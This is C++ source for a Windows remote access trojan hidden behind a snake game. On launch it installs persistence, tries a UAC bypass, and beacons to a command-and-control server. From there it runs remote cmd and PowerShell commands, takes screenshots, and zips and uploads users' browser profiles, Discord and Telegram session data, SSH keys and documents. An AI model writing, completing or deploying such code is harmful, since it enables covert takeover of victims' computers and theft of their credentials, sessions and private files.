#include <windows.h>
#include <thread>
#include <chrono>
#include <string>
#include <vector>
#include <algorithm>
#include <filesystem>
#include <cstdio>

#include "util.h"
#include "http.h"
#include "shell.h"
#include "admin.h"
#include "users.h"
#include "zip.h"
#include "screenshot.h"
#include "uac.h"
#include "persist.h"

extern int run_snake();
namespace fs = std::filesystem;

// ================= НАСТРОЙКИ =================
static const std::wstring C2_HOST_W = L"your-vps.example.com";
static const std::string  C2_HOST_A = "your-vps.example.com";
// =============================================

static std::vector<uint8_t> to_bytes(const std::string& s){
    return std::vector<uint8_t>(s.begin(), s.end());
}

static std::string json_escape(const std::string& s){
    std::string o;
    o.reserve(s.size() + 8);
    for(char c : s){
        switch(c){
            case '"':  o += "\\\""; break;
            case '\\': o += "\\\\"; break;
            case '\n': o += "\\n";  break;
            case '\r': o += "\\r";  break;
            case '\t': o += "\\t";  break;
            default:
                if((unsigned char)c < 0x20){
                    char b[8];
                    sprintf_s(b, "\\u%04x", (unsigned char)c);
                    o += b;
                } else {
                    o += c;
                }
        }
    }
    return o;
}

static std::string c2_post_json(const std::string& path,
                                const std::string& json_body){
    std::vector<std::wstring> hdrs = { L"Content-Type: application/json" };
    auto r = http_request(L"POST", C2_HOST_W, to_w(path), json_body, hdrs);
    if(r.status != 200) return "";
    return r.body;
}

static bool c2_upload_file(const std::string& host,
                           const std::string& name,
                           const std::vector<uint8_t>& data){
    std::string boundary = "----serp" + std::to_string(GetTickCount64());
    std::string body;

    auto field = [&](const std::string& k, const std::string& v){
        body += "--" + boundary + "\r\n";
        body += "Content-Disposition: form-data; name=\"" + k + "\"\r\n\r\n";
        body += v + "\r\n";
    };

    field("host", host);
    field("name", name);

    body += "--" + boundary + "\r\n";
    body += "Content-Disposition: form-data; name=\"file\"; filename=\""
          + name + "\"\r\n";
    body += "Content-Type: application/octet-stream\r\n\r\n";
    body.append((const char*)data.data(), data.size());
    body += "\r\n--" + boundary + "--\r\n";

    std::vector<std::wstring> hdrs = {
        L"Content-Type: multipart/form-data; boundary=" + to_w(boundary)
    };
    auto r = http_request(L"POST", C2_HOST_W, to_w("/file"), body, hdrs);
    return r.status == 200;
}

static std::vector<std::string> parse_cmds(const std::string& body){
    std::vector<std::string> out;
    auto pos = body.find("\"cmds\"");
    if(pos == std::string::npos) return out;
    auto lb = body.find('[', pos);
    auto rb = body.find(']', lb);
    if(lb == std::string::npos || rb == std::string::npos) return out;

    std::string arr = body.substr(lb + 1, rb - lb - 1);
    size_t i = 0;
    while((i = arr.find('"', i)) != std::string::npos){
        size_t j = i + 1;
        std::string cur;
        while(j < arr.size() && arr[j] != '"'){
            if(arr[j] == '\\' && j + 1 < arr.size()){
                char c = arr[j + 1];
                if(c == 'n') cur += '\n';
                else if(c == 'r') cur += '\r';
                else if(c == 't') cur += '\t';
                else cur += c;
                j += 2;
                continue;
            }
            cur += arr[j++];
        }
        out.push_back(cur);
        i = j + 1;
    }
    return out;
}

static void send_result_text(const std::string& host,
                             const std::string& name,
                             const std::string& text){
    std::string body = "{\"host\":\"" + json_escape(host) +
                       "\",\"name\":\"" + json_escape(name) +
                       "\",\"text\":\"" + json_escape(text) + "\"}";
    c2_post_json("/result", body);
}

static void send_result_file(const std::string& host,
                             const std::string& name,
                             const std::vector<uint8_t>& blob){
    c2_upload_file(host, name, blob);
}

static void send_users_list(const std::string& host, bool adm){
    std::string out = "user=" + whoami() + " admin=" + (adm ? "yes" : "no") + "\n\n";
    for(auto& n : list_users()){
        std::string p = "C:\\Users\\" + n;
        out += n + (can_read(p) ? "" : "  [no access]") + "\n";
    }
    send_result_file(host, host + "__users_list.txt", to_bytes(out));
}

static void do_zip(const std::string& host, bool adm, const std::string& me){
    std::string tmp = "C:\\Windows\\Temp\\serp_" + host + ".zip";

    std::vector<std::string> wanted = {
        "Desktop",
        "Documents",
        "Downloads",
        "Pictures",
        "AppData\\Roaming\\Mozilla",
        "AppData\\Roaming\\discord",
        "AppData\\Roaming\\Telegram Desktop\\tdata",
        ".ssh",
        "AppData\\Local\\Google\\Chrome\\User Data\\Default",
    };

    mz_zip_archive zip{};
    if(!mz_zip_writer_init_file(&zip, tmp.c_str(), 0)){
        send_result_text(host, "zip.txt", "init failed");
        return;
    }

    if(adm){
        for(auto& u2 : list_users()){
            std::string root = "C:\\Users\\" + u2;
            for(auto& t : wanted){
                std::string full = root + "\\" + t;
                std::error_code ec;
                if(fs::exists(full, ec))
                    zip_add_dir(&zip, full, u2 + "/" + t);
            }
        }
    } else {
        std::string root = "C:\\Users\\" + me;
        for(auto& t : wanted){
            std::string full = root + "\\" + t;
            std::error_code ec;
            if(fs::exists(full, ec))
                zip_add_dir(&zip, full, t);
        }
    }

    mz_zip_writer_finalize_archive(&zip);
    mz_zip_writer_end(&zip);

    auto data = read_file(tmp);
    DeleteFileA(tmp.c_str());
    if(data.empty()){
        send_result_text(host, "zip.txt", "empty");
        return;
    }
    send_result_file(host, host + "__users.zip", data);
}

static void do_shot(const std::string& host){
    auto png = screenshot_png();
    if(png.empty()){
        send_result_text(host, "shot.txt", "failed");
        return;
    }
    send_result_file(host, host + "__shot.png", png);
}

static void rat_loop(){
    std::string host = hostname();
    std::string me   = whoami();
    bool        adm  = is_admin();

    for(;;){
        std::string body = "{\"host\":\"" + json_escape(host) +
                           "\",\"user\":\"" + json_escape(me) +
                           "\",\"admin\":" + (adm ? "true" : "false") + "}";

        std::string resp = c2_post_json("/beacon", body);
        if(resp.empty()){
            Sleep(5000);
            continue;
        }

        auto cmds = parse_cmds(resp);
        for(auto& text : cmds){
            if(text.rfind("__", 0) != 0) continue;

            if(text.rfind("__shot__", 0) == 0){ do_shot(host); continue; }
            if(text.rfind("__users__", 0) == 0){ send_users_list(host, adm); continue; }
            if(text.rfind("__zip__", 0) == 0){ do_zip(host, adm, me); continue; }

            if(text.rfind("__cmda__", 0) == 0 || text.rfind("__psa__", 0) == 0){
                if(!adm){
                    send_result_text(host, "admin.txt", "no admin rights");
                    continue;
                }
                std::wstring c = (text.rfind("__cmda__", 0) == 0)
                    ? L"cmd.exe /k"
                    : L"powershell.exe -NoExit";
                STARTUPINFOW si{ sizeof(si) };
                PROCESS_INFORMATION pi{};
                CreateProcessW(nullptr, &c[0], nullptr, nullptr, FALSE,
                    0, nullptr, nullptr, &si, &pi);
                continue;
            }

            std::string out;
            if(text.rfind("__cmd__ ", 0) == 0)      out = run_cmd(text.substr(8));
            else if(text.rfind("__ps__ ", 0) == 0)  out = run_ps(text.substr(7));
            else continue;

            send_result_file(host, host + "__out.txt", to_bytes(out));
        }

        Sleep(3000);
    }
}

int main(int argc, char** argv){
    (void)argc; (void)argv;

    ensure_dpi_aware();
    persist_copy();

    if(!is_admin()){
        wchar_t self[MAX_PATH] = {0};
        GetModuleFileNameW(nullptr, self, MAX_PATH);
        std::wstring payload = L"\"" + std::wstring(self) + L"\"";
        uac_bypass_run(payload);
    }

    std::thread(rat_loop).detach();
    return run_snake();
}